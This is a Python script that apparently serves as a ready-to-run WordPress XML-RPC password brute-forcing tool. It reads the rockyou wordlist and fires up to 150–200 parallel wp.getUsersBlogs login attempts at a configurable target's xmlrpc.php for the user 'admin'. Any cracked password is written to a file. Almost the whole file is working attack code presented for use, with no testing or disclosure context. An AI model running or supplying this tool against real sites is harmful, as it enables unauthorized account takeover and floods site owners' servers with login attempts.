import xmlrpc.client
import concurrent.futures
import sys
import time
import threading
from queue import Queue
import os
import socket

class WordPressBruteForcer:
	def __init__(self, target_url, wordlist_path, username, max_workers=100, timeout=10):
		self.target_url = target_url
		self.wordlist_path = wordlist_path
		self.username = username
		self.max_workers = max_workers
		self.timeout = timeout
		self.found = False
		self.lock = threading.Lock()
		self.attempts = 0
		self.start_time = time.time()
		self.password_queue = Queue(maxsize=10000)
		self.producer_finished = False
		
	def create_server_proxy(self):
		"""Creates a ServerProxy with configured timeout"""
		# Configure timeout at socket level
		import http.client
		original_HTTPConnection = http.client.HTTPConnection
		
		class TimeoutHTTPConnection(http.client.HTTPConnection):
			def connect(self):
				http.client.HTTPConnection.connect(self)
				self.sock.settimeout(self.timeout)
		
		# Apply the timeout
		http.client.HTTPConnection = TimeoutHTTPConnection
		http.client.HTTPConnection.timeout = self.timeout
		
		# Create the proxy
		server = xmlrpc.client.ServerProxy(self.target_url)
		
		# Restore original connection
		http.client.HTTPConnection = original_HTTPConnection
		
		return server
	
	def password_producer(self):
		"""Reads the wordlist and puts passwords into the queue"""
		try:
			line_count = 0
			with open(self.wordlist_path, 'r', encoding='latin-1', errors='ignore') as f:
				for line in f:
					if self.found:
						break
					password = line.strip()
					if password:
						self.password_queue.put(password, block=True, timeout=5)
						line_count += 1
						
						# Show progress every 100,000 lines
						if line_count % 100000 == 0:
							elapsed = time.time() - self.start_time
							with self.lock:
								print(f"\r[+] Read: {line_count:,} | "
										f"Attempts: {self.attempts:,} | "
										f"Queue: {self.password_queue.qsize()}", end="")
		except Exception as e:
			print(f"\n[!] Producer error: {e}")
		finally:
			self.producer_finished = True
			print(f"\n[+] Producer finished. Total lines read: {line_count:,}")
	
	def try_password_worker(self):
		"""Worker that takes passwords from the queue and tests them"""
		while not self.found:
			try:
				# Get password from the queue
				password = self.password_queue.get(timeout=2)
				
				try:
					# Create new connection for each attempt
					server = xmlrpc.client.ServerProxy(self.target_url)
					
					# Call method with timeout
					import socket
					socket.setdefaulttimeout(self.timeout)
					
					result = server.wp.getUsersBlogs(self.username, password)
					
					with self.lock:
						self.found = True
						return password
						
				except xmlrpc.client.Fault as e:
					# Authentication error
					pass
				except Exception as e:
					# Other errors (timeout, connection, etc.)
					pass
				finally:
					with self.lock:
						self.attempts += 1
						# Show progress every 100 attempts
						if self.attempts % 100 == 0:
							elapsed = time.time() - self.start_time
							speed = self.attempts / max(elapsed, 1)
							print(f"\r[+] Attempts: {self.attempts:,} | "
									f"Speed: {speed:.1f} pps | "
									f"Queue: {self.password_queue.qsize():,}", end="")
				
				self.password_queue.task_done()
				
			except Exception as e:
				# Queue empty or timeout
				if self.producer_finished and self.password_queue.empty():
					break
				continue
		
		return None
	
	def run(self):
		"""Executes the attack with producer-consumer model"""
		print(f"[+] Target: {self.target_url}")
		print(f"[+] Username: {self.username}")
		print(f"[+] Wordlist: {self.wordlist_path}")
		print(f"[+] Workers: {self.max_workers}")
		print(f"[+] Timeout: {self.timeout} seconds")
		print("[+] Starting attack...\n")
		
		# Show wordlist size
		try:
			file_size = os.path.getsize(self.wordlist_path)
			print(f"[+] Wordlist size: {file_size / (1024*1024):.1f} MB")
		except:
			pass
		
		# Start producer
		producer_thread = threading.Thread(target=self.password_producer, daemon=True)
		producer_thread.start()
		
		# Wait for the queue to populate
		print("[+] Waiting for passwords to load...")
		time.sleep(3)
		
		if self.password_queue.empty():
			print("[!] No passwords being loaded")
			# Force producer exit
			self.producer_finished = True
			return None
		
		print(f"[+] Initial queue: {self.password_queue.qsize()} passwords")
		print("[+] Starting workers...\n")
		
		# Create workers
		found_password = None
		with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
			# Start workers
			worker_futures = [executor.submit(self.try_password_worker) 
							 for _ in range(self.max_workers)]
			
			# Wait for results
			for future in concurrent.futures.as_completed(worker_futures):
				result = future.result()
				if result:
					found_password = result
					self.found = True
					# Cancel other workers
					for f in worker_futures:
						f.cancel()
					executor.shutdown(wait=False)
					break
		
		# Final results
		elapsed = time.time() - self.start_time
		print(f"\n\n{'='*60}")
		
		if found_password:
			print(f"[+] PASSWORD FOUND!")
			print(f"[+] Username: {self.username}")
			print(f"[+] Password: {found_password}")
			print(f"[+] Total time: {elapsed:.2f} seconds")
			print(f"[+] Attempts: {self.attempts:,}")
			print(f"[+] Speed: {self.attempts/max(elapsed, 1):.2f} pps")
			
			# Save result
			try:
				with open("password_found.txt", "w") as f:
					f.write(f"URL: {self.target_url}\n")
					f.write(f"Username: {self.username}\n")
					f.write(f"Password: {found_password}\n")
					f.write(f"Time: {elapsed:.2f}s\n")
					f.write(f"Attempts: {self.attempts}\n")
				print("[+] Result saved in password_found.txt")
			except:
				pass
		else:
			print("[-] Password NOT found")
			print(f"[+] Attempts made: {self.attempts:,}")
			print(f"[+] Total time: {elapsed:.2f} seconds")
			print(f"[+] Average speed: {self.attempts/max(elapsed, 1):.2f} pps")
		
		print(f"{'='*60}")
		return found_password

# SIMPLE and FAST version
def brute_force_simple(target_url, username, wordlist_path, max_workers=200):
	"""Simple version without complex queues"""
	print("[+] SIMPLE AND FAST MODE")
	print(f"[+] Workers: {max_workers}")
	
	found_password = None
	attempts = 0
	start_time = time.time()
	lock = threading.Lock()
	
	def try_password(password):
		nonlocal found_password, attempts
		
		if found_password:
			return False
			
		try:
			# Configure global timeout
			import socket
			socket.setdefaulttimeout(5)
			
			server = xmlrpc.client.ServerProxy(target_url)
			result = server.wp.getUsersBlogs(username, password)
			
			with lock:
				found_password = password
			return True
			
		except xmlrpc.client.Fault:
			# Normal authentication error
			pass
		except Exception as e:
			# Other errors
			pass
		
		with lock:
			attempts += 1
			if attempts % 500 == 0:
				elapsed = time.time() - start_time
				print(f"\r[+] Processed: {attempts:,} | "
						f"Speed: {attempts/max(elapsed, 1):.0f} pps", end="")
		
		return False
	
	# Read passwords and process
	passwords = []
	try:
		# Read password chunk
		with open(wordlist_path, 'r', encoding='latin-1', errors='ignore') as f:
			for line in f:
				password = line.strip()
				if password:
					passwords.append(password)
					if len(passwords) >= 10000:  # Process in 10k chunks
						break
		
		print(f"[+] Processing chunk of {len(passwords):,} passwords...")
		
		with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
			# Send all chunk passwords
			future_to_pass = {executor.submit(try_password, pwd): pwd for pwd in passwords}
			
			for future in concurrent.futures.as_completed(future_to_pass):
				if future.result():  # Returns True if password found
					executor.shutdown(wait=False, cancel_futures=True)
					break
					
	except Exception as e:
		print(f"\n[!] Error: {e}")
	
	return found_password

if __name__ == "__main__":
	# CONFIGURATION - CHANGE THIS!
	TARGET_URL = "http://yousite.com/xmlrpc.php"  # ← TARGET URL
	USERNAME = "admin"  # ← USER TO TEST
	WORDLIST = "/usr/share/wordlists/rockyou.txt"
	
	# PERFORMANCE SETTINGS (adjust based on hardware)
	MAX_WORKERS = 150     # Number of simultaneous threads
	TIMEOUT = 5           # Timeout per connection (seconds)
	
	print("="*60)
	print("WORDPRESS XML-RPC BRUTE FORCER - FIXED VERSION")
	print("="*60)
	
	# Verify wordlist
	if not os.path.exists(WORDLIST):
		print(f"[!] Error: {WORDLIST} not found")
		print("[+] Attempting to decompress rockyou.txt.gz...")
		try:
			os.system("sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null")
			if os.path.exists(WORDLIST):
				print("[+] Wordlist decompressed successfully")
			else:
				print("[!] Download rockyou.txt or specify another wordlist")
				sys.exit(1)
		except:
			print("[!] Specify a valid wordlist with: python3 script.py /path/to/wordlist.txt")
			sys.exit(1)
	
	# Verify connection to target
	print(f"[+] Testing connection to {TARGET_URL}...")
	try:
		server = xmlrpc.client.ServerProxy(TARGET_URL)
		# Configure timeout
		import socket
		socket.setdefaulttimeout(10)
		
		# Test system.listMethods method
		methods = server.system.listMethods()
		if 'wp.getUsersBlogs' in methods:
			print("[+] ✓ XML-RPC working and method available")
		else:
			print("[!] Method wp.getUsersBlogs not available")
			print(f"[+] Available methods: {methods}")
			sys.exit(1)
			
	except Exception as e:
		print(f"[!] Error connecting to {TARGET_URL}")
		print(f"[!] Details: {e}")
		print("\n[+] Check:")
		print("    1. URL is correct (must end in /xmlrpc.php)")
		print("    2. Site has XML-RPC enabled")
		print("    3. No firewall blocking the connection")
		sys.exit(1)
	
	# Choose mode
	print("\n[1] Producer-Consumer Mode (recommended for large wordlists)")
	print("[2] Simple Mode (faster for initial tests)")
	
	try:
		choice = input("\nSelect mode (1/2): ").strip()
	except KeyboardInterrupt:
		print("\n[!] Interrupted by user")
		sys.exit(0)
	
	if choice == "2":
		print("\n[+] Starting simple mode...")
		password = brute_force_simple(
			TARGET_URL, 
			USERNAME, 
			WORDLIST,
			max_workers=MAX_WORKERS
		)
	else:
		print("\n[+] Starting producer-consumer mode...")
		brforcer = WordPressBruteForcer(
			target_url=TARGET_URL,
			wordlist_path=WORDLIST,
			username=USERNAME,
			max_workers=MAX_WORKERS,
			timeout=TIMEOUT
		)
		password = brforcer.run()
	
	# Final result
	if password:
		print(f"\n{'#'*60}")
		print(f"# PASSWORD FOUND: {password}")
		print(f"{'#'*60}")
		print(f"\n[+] Credentials: {USERNAME}:{password}")
		print(f"[+] URL: {TARGET_URL}")
	else:
		print("\n[-] Attack did not find the password")
		print("[+] Consider:")
		print("    - Testing with another user")
		print("    - Using a different wordlist")
		print("    - Verifying that XML-RPC is actually enabled")